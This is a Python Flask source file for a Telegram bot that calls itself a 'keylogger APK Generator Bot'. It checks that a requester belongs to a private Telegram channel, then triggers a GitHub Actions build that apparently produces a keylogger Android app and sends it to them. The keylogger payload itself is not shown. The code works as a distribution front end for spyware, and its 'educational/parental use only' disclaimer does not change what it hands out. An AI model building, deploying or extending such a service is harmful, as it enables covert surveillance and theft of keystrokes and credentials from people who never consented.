import os
import logging
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
app.logger.setLevel(logging.DEBUG)

# Environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
GITHUB_PAT = os.getenv("GITHUB_PAT")
CHANNEL_ID = "-1002264821568"  # Your private channel ID

if not all([BOT_TOKEN, REPO_OWNER, REPO_NAME, GITHUB_PAT]):
    raise ValueError("Missing one or more required environment variables.")

@app.route("/", methods=["GET"])
def home():
    return render_template_string(open("templates/index.html").read())

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_message():
    data = request.get_json()
    app.logger.debug(f"Telegram data: {data}")

    message = data.get("message", {})
    chat_id = str(message.get("chat", {}).get("id"))
    command = message.get("text", "").strip()

    if not chat_id or not command:
        return "Invalid data", 400

    if command == "/start":
        welcome = (
            "\U0001F44B Welcome to the keylogger APK Generator Bot!\n\n"
            "Made by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
            "\U0001F6E1 Disclaimer: For educational/parental use only.\n\n"
            "Join our Telegram channel to use /request_apk:\n"
            "<a href=\"https://t.me/+lnwNZG4bJnsxYTk9\">Join Channel</a>"
        )
        send_message(chat_id, welcome, "HTML")

    elif command == "/request_apk":
        if is_user_in_channel(chat_id):
            response = trigger_github_action(chat_id)
            if response and response.status_code == 204:
                send_message(chat_id, "\u2705 Your APK is being generated. You'll receive it shortly!")
            else:
                send_message(chat_id, "\u274C Error generating APK. Try again later.")
        else:
            send_message(chat_id, "\u26D4 You must join our private channel to use this command.\n\n👉 Join here: https://t.me/+lnwNZG4bJnsxYTk9")

    else:
        send_message(chat_id, "\u2753 Unknown command. Use /start for help.")

    return "OK"

def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        requests.post(url, data=payload)
    except Exception as e:
        app.logger.error(f"Telegram Error: {e}")

def is_user_in_channel(chat_id):
    check_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember?chat_id={CHANNEL_ID}&user_id={chat_id}"
    try:
        res = requests.get(check_url)
        data = res.json()
        status = data.get("result", {}).get("status")
        return status in ["member", "administrator", "creator"]
    except Exception as e:
        app.logger.error(f"Channel check error: {e}")
        return False

def trigger_github_action(chat_id):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/build.yml/dispatches"
    payload = {"ref": "main", "inputs": {"chat_id": str(chat_id)}}
    headers = {
        "Authorization": f"Bearer {GITHUB_PAT}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response
    except Exception as e:
        app.logger.error(f"GitHub Trigger Exception: {e}")
        return None

@app.route("/join", methods=["GET"])
def join_page():
    return '''
        <h2>📱 Free Access Granted!</h2>
        <p>Click below to join the private Telegram channel and use the bot:</p>
        <a href="https://t.me/+lnwNZG4bJnsxYTk9" target="_blank" style="font-size:18px;">👉 Join Tellogs Channel</a>
    '''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)
